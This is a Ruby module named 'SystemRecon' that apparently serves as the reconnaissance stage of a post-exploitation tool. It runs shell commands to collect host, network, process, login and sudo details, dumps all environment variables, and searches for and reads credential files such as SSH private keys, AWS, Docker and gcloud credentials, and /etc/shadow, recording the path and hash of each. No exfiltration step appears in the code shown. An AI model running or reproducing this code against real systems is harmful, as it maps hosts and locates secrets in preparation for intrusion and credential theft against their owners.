require 'open3'
require 'tempfile'
require 'digest'

module SystemRecon
  class << self
    def gather_system_info
      info = {}
      info[:hostname] = Socket.gethostname
      info[:user] = Etc.getlogin rescue ENV['USER']
      info[:uid] = Etc.getuid.to_s
      info[:gid] = Etc.getgid.to_s
      info[:ruby_version] = RUBY_VERSION
      info[:ruby_platform] = RUBY_PLATFORM
      info[:arch] = run_cmd('uname -m').strip
      info[:os_release] = run_cmd('freebsd-version 2>/dev/null || uname -rs').strip
      info[:kernel] = run_cmd('uname -a').strip
      info[:uptime] = run_cmd('uptime').strip
      info[:memory] = run_cmd('sysctl -n hw.physmem 2>/dev/null || cat /proc/meminfo 2>/dev/null').strip
      info[:cpu_info] = run_cmd('sysctl -n hw.model 2>/dev/null || lscpu 2>/dev/null').strip
      info[:network_interfaces] = run_cmd('ifconfig -l 2>/dev/null || ip addr 2>/dev/null').strip
      info[:dns] = run_cmd('cat /etc/resolv.conf 2>/dev/null').strip
      info[:crontabs] = run_cmd('crontab -l 2>/dev/null').strip
      info[:listening_ports] = run_cmd('sockstat -4 -l 2>/dev/null || netstat -tlnp 2>/dev/null').strip
      info[:running_processes] = run_cmd('ps aux').strip
      info[:mounted_filesystems] = run_cmd('mount').strip
      info[:last_logins] = run_cmd('last -10 2>/dev/null || lastlog 2>/dev/null | head -20').strip
      info[:ssh_keys] = run_cmd('ls -la ~/.ssh/ 2>/dev/null').strip
      info[:sudoers] = run_cmd('sudo -l 2>&1').strip
      info[:env_dump] = ENV.to_hash.map { |k, v| "#{k}=#{v}" }.join("\n")

      info
    end

    def run_cmd(cmd)
      begin
        stdout, stderr, status = Open3.capture3(cmd)
        (stdout + stderr).gsub(/\0/, '')
      rescue => e
        ''
      end
    end

    def find_sensitive_files
      patterns = [
        '~/.ssh/id_*',
        '~/.gnupg/*.key',
        '~/.config/gcloud/credentials.db',
        '~/.docker/config.json',
        '~/.aws/*',
        '/etc/passwd',
        '/etc/shadow',
        '/etc/master.passwd',
        '/root/.ssh/*',
        '/tmp/*.key',
        '/tmp/*.pem',
        '/tmp/*.crt',
        '**/*.p12',
        '**/*.pfx',
        '**/*.keystore',
        '**/*.jks',
      ]

      found = []
      patterns.each do |pattern|
        expanded = File.expand_path(pattern)
        Dir.glob(expanded).each do |f|
          next unless File.file?(f)
          begin
            content = File.read(f)
            found << {
              path: f,
              size: content.bytesize,
              hash: Digest::SHA256.hexdigest(content),
              readable: File.readable?(f)
            }
          rescue => e
            nil
          end
        end
      end

      found
    end
  end
end
